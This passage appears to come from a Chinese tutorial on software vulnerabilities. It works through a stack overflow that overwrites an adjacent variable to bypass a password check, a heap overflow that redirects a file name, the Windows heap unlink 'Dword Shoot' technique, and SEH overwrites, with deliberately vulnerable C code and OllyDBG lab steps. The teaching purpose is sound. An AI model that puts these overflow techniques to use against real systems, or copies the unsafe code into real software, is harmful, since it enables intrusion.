class="headerlink" title="覆盖临接变量"></a>覆盖临接变量</h4><p>在第三章，我们通过修改机器码实现了软件破解，接下来我们通过在输入上做文章（也是漏洞利用方式），试着覆盖临近变量的值，以便更改程序执行流程。</p><p>函数的局部变量在栈中一个挨着一个排列。如果这些局部变量中有<strong>数组之类的缓冲区</strong>，并且程序中<strong>存在数组越界的缺陷</strong>，那么越界的数组元素就有可能破坏栈中相邻变量的值，甚至破坏栈帧中所保存的EBP值、返回地址等重要数据。<br>用一个简单例子来说明破坏栈内局部变量对程序的安全性有什么影响（VC6）。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PASSWORD <span class="string">&quot;1234567&quot;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">verify_password</span><span class="params">(<span class="type">char</span> * password)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> authenticated;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">8</span>];  <span class="comment">//add local buff to be overflowed</span></span><br><span class="line">    authenticated = <span class="built_in">strcmp</span>(password, PASSWORD);</span><br><span class="line">    <span class="built_in">strcpy</span>(buffer, password);</span><br><span class="line">    <span class="keyword">return</span> authenticated;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> valid_flag = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> password[<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">   &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;please input password:    &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, password);</span><br><span class="line">        valid_flag = <span class="built_in">verify_password</span>(password);</span><br><span class="line">        <span class="keyword">if</span>(valid_flag)</span><br><span class="line">        &#123;           <span class="built_in">printf</span> (<span class="string">&quot;incorrect password!\n\n&quot;</span>);</span><br><span class="line">         &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">         &#123;           <span class="built_in">printf</span>(<span class="string">&quot;Congratulation! You have passed the verification!\n&quot;</span>);</span><br><span class="line">                     <span class="keyword">break</span>;</span><br><span class="line">         &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>观察一下源代码不难发现，<code>authenticated</code>变量的值来源于<code>strcmp</code>函数的返回值，之后会返回给main函数作为密码验证成功与否的标志变量：<br>当authenticated为0时，表示验证成功；反之，验证不成功。</p></blockquote><p>如果我们输入的密码超过了7个字符（注意：字符串截断符NULL将占用一个字节），则越界字符的ASCII码会修改掉authenticated的值。如果这段溢出数据恰好把authenticated改为0，则程序流程将被改变。 要<strong>成功覆盖临近变量并使其为0</strong>，有两个条件：</p><ul><li>输入一个8位的字符串的时候，比如“22334455”，此时，<u>字符串的结束符恰恰是0</u>，则覆盖变量authenticated的高字节并使其为0；</li><li>输入的字符串应该大于“12345678”，因为执行strcmp之后要确保变量authenticated的值为1，也就是只有高字节是1，其它字节为0。</li></ul><h4 id="实验细节"><a href="#实验细节" class="headerlink" title="实验细节"></a>实验细节</h4><p>打开OllyDBG，装载程序后，会停在程序入口点，单步执行可以定位到<strong>主函数</strong>：第一，主函数通过OllyDBG的信息提示区域，会显示<strong>main函数信息</strong>；第二，Windows控制台程序的主函数参数包含三个，即_argc、_argv和_environ，在函数调用前面的参数入栈环节具有鲜明的特征，如下：</p><p><img src="/2023/03/13/ruan-jian-lou-dong-pian/1fc8a63dbdb8c6cf9150dc515da760df.png" class="lazyload placeholder" data-srcset="/2023/03/13/ruan-jian-lou-dong-pian/1fc8a63dbdb8c6cf9150dc515da760df.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>此时，选择<strong>步入执行</strong>即可转到主函数。之后继续一步步执行程序，会遇到<code>Scanf</code>函数，弹出对话框，接受用户输入，我们输入“22334455”，然后会回到原来程序，继续单步运行，直到调用<code>verify_password</code>函数后，进入该函数代码区域。</p><p><img src="/2023/03/13/ruan-jian-lou-dong-pian/1fbff66e84966cedf1c72d238f7590c2.png" class="lazyload placeholder" data-srcset="/2023/03/13/ruan-jian-lou-dong-pian/1fbff66e84966cedf1c72d238f7590c2.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>在执行完口令比较后，运行完<code>mov dword part [ebp-4], eax</code>语句，该语句含义为将EAX寄存器的值（刚执行的strcmp函数的返回值）复制给地址ebp-4的局部变量。也就是，将口令比较的结果复制给我们定义的局部变量authenticated。</p><p><strong>通过寄存器窗口，可知当前EBP寄存器值为0x0012FB24</strong>，观察此时栈区变化，观察此时ebp-4地址处的变量值，同时，我们将数据窗口定位到地址0x0012FB20处（数据窗口区域，点右键，选择“转到-&gt;表达式”，出现表达式后，输入0x0012FB20或EBP-4，然后选择“跟随表达式”），来观察后续的变化，如下：</p><p><img src="/2023/03/13/ruan-jian-lou-dong-pian/ffaa975b4396692e09039b8471dd5fed.png" class="lazyload placeholder" data-srcset="/2023/03/13/ruan-jian-lou-dong-pian/ffaa975b4396692e09039b8471dd5fed.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>当程序执行到strcpy溢出覆盖后的“mov eax, dword ptr [ebp-4]”之前，我们可以观察到，溢出成功的覆盖了变量authenticated的值为0x00000000。</p><h2 id="堆溢出漏洞"><a href="#堆溢出漏洞" class="headerlink" title="堆溢出漏洞"></a>堆溢出漏洞</h2><h3 id="堆溢出漏洞示例"><a href="#堆溢出漏洞示例" class="headerlink" title="堆溢出漏洞示例"></a>堆溢出漏洞示例</h3><p>堆溢出是指在堆中发生的缓冲区溢出。堆溢出后，数据可以覆盖堆区的不同堆块的数据，带来安全威胁。</p><p>我们将通过下面一个简单例子，来演示一个简单的堆溢出漏洞：该漏洞在产生溢出的时候，将覆盖一个目标堆块的块身数据。</p><p><strong>示例</strong>：从堆区申请两个堆块，处于低地址的buf1和处于高地址的buf2。buf2存储了一个名为myoutfile 的字符串，用来存储文件名。buf1用来接收输入，同时将这些输入字符在程序执行过程中写入到buf2 存储的文件名myoutfile 所指向的文件中。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILENAME <span class="string">&quot;myoutfile&quot;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *fd;</span><br><span class="line">    <span class="type">long</span> diff;</span><br><span class="line">    <span class="type">char</span> bufchar[<span class="number">100</span>];</span><br><span class="line">    <span class="type">char</span> *buf1 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">20</span>);</span><br><span class="line">    <span class="type">char</span> *buf2 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">20</span>);</span><br><span class="line">    diff = (<span class="type">long</span> <span class="type">long</span>)buf2 - (<span class="type">long</span> <span class="type">long</span>)buf1;</span><br><span class="line">    <span class="built_in">strcpy</span>(buf2, FILENAME);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;----信息显示----\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;buf1 存储地址:%p\n&quot;</span>, buf1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;buf2 存储地址:%p,存储内容为文件名:%s\n&quot;</span>, buf2, buf2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;两个地址之间的距离:%d 个字节 \n&quot;</span>, diff);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;----信息显示----\n\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;请输入要写入文件%s 的字符串:\n&quot;</span>, buf2);</span><br><span class="line">        <span class="built_in">gets</span>(bufchar);</span><br><span class="line">        <span class="built_in">strcpy</span>(buf1, bufchar);<span class="comment">//很明显，往buf1复制，没有边界检查</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">strcpy</span>(buf1, argv[<span class="number">1</span>]);<span class="comment">//很明显，往buf1复制，没有边界检查</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//溢出后，导致buf2可能变成设计的目标文件，而非原始文件</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;----信息显示----\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;buf1 存储内容:%s \n&quot;</span>, buf1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;buf2 存储内容:%s \n&quot;</span>, buf2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;----信息显示----\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;将%s\n 写入文件 %s 中\n\n&quot;</span>, buf1, buf2);</span><br><span class="line">    fd = <span class="built_in">fopen</span>(buf2, <span class="string">&quot;a&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (fd  <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;%s 打开错误\n&quot;</span>, buf2);</span><br><span class="line">        <span class="keyword">if</span> (diff &lt;= <span class="built_in">strlen</span>(bufchar))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;提示:buf1 内存溢出!\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">getchar</span>();</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fprintf</span>(fd, <span class="string">&quot;%s\n\n&quot;</span>, buf1);</span><br><span class="line">    <span class="built_in">fclose</span>(fd);</span><br><span class="line">    <span class="keyword">if</span> (diff &lt;= <span class="built_in">strlen</span>(bufchar))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;提示:buf1 已溢出，溢出部分覆盖 buf2 中的 myoutfile\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过<code>malloc</code>命令，申请了两个堆的存储空间。接着定义了diff变量，它记录了buf1和buf2之间的地址距离，也就是说buf1和buf2之间还有多少存储空间。(具体空间大小看编译器应该)</p><p><img src="/2023/03/13/ruan-jian-lou-dong-pian/3e4e99794a43aab6e66997bac952b5be.png" class="lazyload placeholder" data-srcset="/2023/03/13/ruan-jian-lou-dong-pian/3e4e99794a43aab6e66997bac952b5be.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>输入字符串的长度为大于72个字节，而且刻意构造一个自定义的字符串“hostility”，是输入为“72字节填充数据”+“hostility”。可见buf1的内容长度是超过了72个字节的，而buf2的内容就变成了hostility。</p><p><img src="/2023/03/13/ruan-jian-lou-dong-pian/73e3229bfec0038e1b1d0b8c6a1257a7.png" class="lazyload placeholder" data-srcset="/2023/03/13/ruan-jian-lou-dong-pian/73e3229bfec0038e1b1d0b8c6a1257a7.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>fopen语句将buf2指向的文件打开，打开的形式是<strong>追加行</strong>，用了关键字“a”。即打开这个文件后，<strong>如果这个文件是以前存在的，那么写入的文件就添加到已有的内容之后；如果是以前不存在的一个文件，就创建这个文件并写入相应的内容。</strong><br>用fprintf 语句将buf1中已经获得的语句写入到这个文件里。然后关闭文件。</p><p><code>因为buf1后面没有字符串结束符，所以读取不会停止！</code></p><h3 id="堆溢出漏洞利用"><a href="#堆溢出漏洞利用" class="headerlink" title="堆溢出漏洞利用"></a>堆溢出漏洞利用</h3><p>相比于栈溢出，<strong>堆溢出的实现难度更大</strong>，而且往往要求进程在内存中具备特定的组织结构。然而，堆溢出攻击也已经成为缓冲区溢出攻击的<u>主要方式之一</u>。堆溢出带来的威胁远远不止上面示例演示的那样，结合堆管理结构，<strong>堆溢出漏洞可以在任意位置写入任意数据！</strong></p><h3 id="堆管理结构"><a href="#堆管理结构" class="headerlink" title="堆管理结构"></a>堆管理结构</h3><p>在Windows系统中，占有态的堆块被使用它的程序索引，而堆表只索引所有空闲态的堆块。其中，最重要的堆表有两种：空闲双向链表freelist（简称空表）和快速单向链表lookaside（简称快表）。</p><p>堆块三类操作：堆块分配、堆块释放和堆块合并，<strong>归根结底是对空表链的修改</strong>。这些修改无外乎要向链表里链入和卸下堆块。根据对链表操作的常识，我们可以知道，从链表上卸载（unlink）一个节点的时候会发生如下操作：</p><p><code>node—&gt;blink—&gt;flink = node—&gt;flink ;</code><br><code>node—&gt;flink—&gt;blink = node—&gt;blink ;</code></p><p><img src="/2023/03/13/ruan-jian-lou-dong-pian/9bf243ed5dead30b5acb2d195150a416.png" class="lazyload placeholder" data-srcset="/2023/03/13/ruan-jian-lou-dong-pian/9bf243ed5dead30b5acb2d195150a416.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>具体的，在Windows堆内存分配时会调用函数<code>RtlAllocHeap</code>，该函数从空闲堆链上摘下一空闲堆块，完成双向链表里相关节点的前后指针的变更操作，它会执行如下操作：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//空闲堆块的前向指针（数值）写入到空闲堆块的后向指针（地址）里去</span></span><br><span class="line"></span><br><span class="line">mov dword ptr [edi], ecx ;</span><br><span class="line">mov dword ptr [ecx+<span class="number">4</span>], edi ;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ecx相当于node-&gt;flink,edx相当于node-&gt;blink</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//[edi]相当于node—&gt;blink—&gt;flink,[ecx+4]相当于node—&gt;flink—&gt;blink</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//[ecx]相当于node—&gt;flink—&gt;flink,前向指针的地址在后向指针前面！！！</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其中ecx为<strong>空闲可分配的堆区块的前向指针</strong>，edi为<strong>该堆区块的后向指针</strong>。这两条汇编语句恰好对应了上述两个链表卸载节点对应的前后向指针变化的操作。</p><h3 id="Dword-Shoot攻击"><a href="#Dword-Shoot攻击" class="headerlink" title="Dword Shoot攻击"></a>Dword Shoot攻击</h3><p>如果我们通过堆溢出覆写了一个空闲堆块的块首的前向指针flink和后向指针blink，我们可以精心构造一个<u>地址</u>和一个<u>数据</u>，当这个空闲堆块从链表里卸下的时候，就获得一次向内存构造的任意地址写入一个任意数据的机会。这种能够<strong>向内存任意位置写入任意数据</strong>的机会称为<u>“Arbitrary Dword Reset”（又称Dword Shoot）</u>。具体如下图所示。</p><p><font color="red">why?</font></p><p><img src="/2023/03/13/ruan-jian-lou-dong-pian/14bcf26258852f34bd8da072a45d669c.png" class="lazyload placeholder" data-srcset="/2023/03/13/ruan-jian-lou-dong-pian/14bcf26258852f34bd8da072a45d669c.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>基于Dword Shoot攻击，攻击者甚至可以<strong>劫持进程</strong>，运行植入的恶意代码。比如，当构造的地址为重要函数调用地址、栈帧中函数返回地址、栈帧中SEH的句柄等时，写入的任意数据可能就是恶意代码的入口地址。</p><h3 id="Dword-Shoot攻击示例"><a href="#Dword-Shoot攻击示例" class="headerlink" title="Dword Shoot攻击示例"></a>Dword Shoot攻击示例</h3><p><strong>堆溢出漏洞示例</strong>：以下列程序为例，演示堆块分配过程中潜在的Dword Shoot攻击。<br>实验环境：VC6.0、Windows XP SP3、<u>Debug模式</u>。</p><p>在讲这个实验之前，先介绍一下Windows的堆使用。<br>在Windows里，可以使用Windows缺省堆，也可以用户自己创建新堆：</p><ul><li>获取缺省堆可以通过GetProcessHeap函数（无参数）得到句柄；</li><li>创建新堆可以用<strong>HeapCreat</strong>函数。</li><li>除了malloc、new等函数外，C/C++也提供了<strong>HeapAlloc</strong>、HeapFree等函数用于堆的分配和释放。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="built_in">main</span>()</span><br><span class="line">&#123;</span><br><span class="line">    HLOCAL h1, h2,h3,h4,h5,h6;</span><br><span class="line">    HANDLE hp;</span><br><span class="line">    hp = <span class="built_in">HeapCreate</span>(<span class="number">0</span>,<span class="number">0x1000</span>,<span class="number">0x10000</span>); <span class="comment">//创建自主管理的堆</span></span><br><span class="line">    h1 = <span class="built_in">HeapAlloc</span>(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);<span class="comment">//从堆里申请空间</span></span><br><span class="line">    h2 = <span class="built_in">HeapAlloc</span>(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">    h3 = <span class="built_in">HeapAlloc</span>(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">    h4 = <span class="built_in">HeapAlloc</span>(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">    h5 = <span class="built_in">HeapAlloc</span>(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">    h6 = <span class="built_in">HeapAlloc</span>(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">_asm <span class="type">int</span> <span class="number">3</span>  <span class="comment">//手动增加int3中断指令，会让调试器在此处中断</span></span><br><span class="line"><span class="comment">//依次释放奇数堆块，避免堆块合并</span></span><br><span class="line"><span class="built_in">HeapFree</span>(hp,<span class="number">0</span>,h1); <span class="comment">//释放堆块</span></span><br><span class="line"><span class="built_in">HeapFree</span>(hp,<span class="number">0</span>,h3); </span><br><span class="line"><span class="built_in">HeapFree</span>(hp,<span class="number">0</span>,h5); <span class="comment">//现在freelist[2]有3个元素</span></span><br><span class="line"></span><br><span class="line">h1 = <span class="built_in">HeapAlloc</span>(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>); </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="整个流程解析"><a href="#整个流程解析" class="headerlink" title="整个流程解析"></a>整个流程解析</h4><ol><li>程序首先创建了一个大小为 0x1000 的堆区，并从其中连续申请了6个块身大小为 8 字节的堆块，加上块首实际上是6个16字节的堆块。</li><li>释放奇数次申请的堆块是为了<strong>防止堆块合并的发生</strong>。</li><li>三次释放结束后，会形成三个16个字节的空闲堆块放入空表。因为是16个字节，所以会被依次放入freelist[2]所标识的空表，它们依次是h1、h3、h5。</li><li>再次申请8字节的堆区内存，加上块首是16个字节，因此会从freelist[2]所标识的空表中摘取第一个空闲堆块出来，即h1。</li><li>如果我们<strong>手动修改h1块首中的前后向指针</strong>，能够观察到 DWORD SHOOT 的发生。</li></ol><h4 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h4><ul><li>执行 HeapFree(hp,0,h1)语句时</li></ul><p>hp为0x003a0000, h1为0x003a0688，根据堆块结构，我们知道 h1 堆块的<u>块身起始位置为0x003a0688，块首起始位置为0x003a0680</u>。观察该语句执行后，对应的内存变化，如下：</p><p><img src="/2023/03/13/ruan-jian-lou-dong-pian/a1d7bc333512ca33e9c11db9997e67b7.png" class="lazyload placeholder" data-srcset="/2023/03/13/ruan-jian-lou-dong-pian/a1d7bc333512ca33e9c11db9997e67b7.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>可见，除了块首状态变化外，0x003a0688开始的<strong>块身位置的前8个字节（Flink 和 Blink）</strong>发生了变化，由0x000000变为具体的有效地址。</p><p>注意到，这个是第一个16字节的堆块释放，将<br>被链入到freelist[2]空表中，而此时Flink和Blink的值都是0x003a0198，也是freelist[2]的地址。我们转到0x003a0198处，观察内存为：</p><p><img src="/2023/03/13/ruan-jian-lou-dong-pian/11f8dc7b87b0515b5bb1bcb38fa62830.png" class="lazyload placeholder" data-srcset="/2023/03/13/ruan-jian-lou-dong-pian/11f8dc7b87b0515b5bb1bcb38fa62830.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>可见，freelist[2]的Flink和Blink都是0x003a0688。意味着，当前 freelist[2]唯一后继节点就是刚刚空闲的h1块（<strong>地址为0x003a0688</strong>），而h1块是唯一前继节点是freelist[2]。其它地址（freelist[3]、freelist[4]、freelist[5]）的Flink和Blink均<strong>指向自身</strong>，说明都是空表。</p><ul><li>执行HeapFree(hp,0,h3)和HeapFree(hp,0,h5)后</li></ul><p>可知，此时 freelist[2]链表状态为：freelist[2]&lt;=&gt;h1&lt;=&gt;h3&lt;=&gt;h5。</p><ul><li>执行HeapAlloc(hp,HEAP_ZERO_MEMORY,8)语句时</li></ul><p>此时，当再次分配空间的时候，从freelist[2]的双向链表里摘下一块大小为16字节的堆块，首先摘得h1（地址为0x003a0688）。</p><p>观察此时：</p><ol><li>freelist[2]（地址为0x003a0198）所存储的信息为：Flink（前4个字节）为0x003a0688，Blink（后 4 个字节）为0x003a0708。</li><li>h1（地址为0x003a0688）所存储的信息为：Flink 为 0x003a06c8，Blink 为 0x003a0198。</li><li>h3（地址为0x003a06c8）所存储的信息为：Flink 为0x003a0708，Blink为0x003a0688。摘走h1之后，内存变为：</li><li>freelist[2]（地址为0x003a0198）的前 4 个字节变为0x003a06c8，实际发生了将h1 后向指针（值为0x003a0198）地址处的值写为h1前向指针的值。</li><li>h3（地址为0x003a06c8）的Blink 变为h1-&gt;Blink，即0x003a0198，实际发生了将 h1 前向指针（值为0x003a06c8）地址处的值写为 h1后向指针的值。</li></ol><ul><li>Dword Shoot 攻击</li></ul><p>假设在执行该语句之前，<strong>h1的Flink和Blink被改写为特定地址和特定数值</strong>，那么就完成一<br>次Dword Shoot攻击。</p><blockquote><p>注意：在Windows XP以后的操作系统中，因为<strong>引入地址随机化</strong>等防护措施，使得此类的堆溢出Dowrd Shoot攻击变的越来越难。</p></blockquote><h2 id="其它溢出漏洞"><a href="#其它溢出漏洞" class="headerlink" title="其它溢出漏洞"></a>其它溢出漏洞</h2><h3 id="SEH结构溢出"><a href="#SEH结构溢出" class="headerlink" title="SEH结构溢出"></a>SEH结构溢出</h3><p>为了保证系统在遇到错误时不至于崩溃，仍能够健壮稳定地继续运行下去，Windows会对运行在其中的程序提供一次补救的机会来处理错误，这种机制就是<strong>异常处理机制</strong>。<br><strong>异常处理结构体SEH</strong>是Windows异常处理机制所采用的重要数据结构:</p><ul><li>SHE结构体<strong>存放在栈中</strong>，栈中的多个SEH通过<strong>链表指针</strong>在栈内由栈顶向栈底串成单向链表;</li><li>位于链表最顶端的SEH通过<strong>线程环境块</strong>（TEB，Thread Environment Block）0字节偏移处的指针标识;</li><li>每个SEH包含两个DWORD指针：<u>SEH链表指针和异常处理函数句柄</u>，共8个字节。</li></ul><p><img src="/2023/03/13/ruan-jian-lou-dong-pian/4fe8d0e44169e83eed814f14c701a7af.png" class="lazyload placeholder" data-srcset="/2023/03/13/ruan-jian-lou-dong-pian/4fe8d0e44169e83eed814f14c701a7af.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>SEH结构用作异常处理，主要包括如下三个方面： </p><ul><li><strong>当线程初始化时，会自动向栈中安装一个SEH，作为线程默认的异常处理。</strong>如果程序源代码中使用了_try{}_except{}或者Assert宏等异常处理机制，编译器将最终通过向当前函数栈帧中安装一个SEH来实现异常处理。</li><li><strong>当异常发生时，操作系统会中断程序，并首先从TEB的0字节偏移处取出距离栈顶最近的SEH，使用异常处理函数句柄所指向的代码来处理异常</strong>。<u>当最近的异常处理函数运行失败时，将顺着SEH链表依次尝试其他的异常处理函数。</u></li><li>如果程序安装的所有异常处理函数<strong>都不能处理这个异常，系统会调用默认的系统处理程序</strong>，通常显示一个对话框，你可以选择关闭或者最后将其附加到调试器上的调试按钮。如果没有调试器能被附加于其上或者调试器也处理不了，系统就调用<code>ExitProcess</code>终结程序。</li></ul><h3 id="SEH攻击"><a href="#SEH攻击" class="headerlink" title="SEH攻击"></a>SEH攻击</h3><p>SEH攻击是指通过<strong>栈溢出</strong>或者其他漏洞，使用精心构造的数据<strong>覆盖SEH链表的入口地址、异常处理函数句柄或链表指针</strong>等，实现程序执行流程的控制。<br>因为发生异常的时候，程序会基于SEH链表转去执行一个预先设定的回调函数，攻击者可以利用这个结构进行漏洞利用攻击。</p><ul><li>由于SEH存放在栈中，利用缓冲区溢出可以覆盖SHE。</li><li>如果精心设计溢出数据，则有可能把SEH中异常处理函数的入口地址更改为恶意程序的入口地址，实现进程的控制。</li></ul><h3 id="SEH链表在栈中的实际分布"><a href="#SEH链表在栈中的实际分布" class="headerlink" title="SEH链表在栈中的实际分布"></a>SEH链表在栈中的实际分布</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 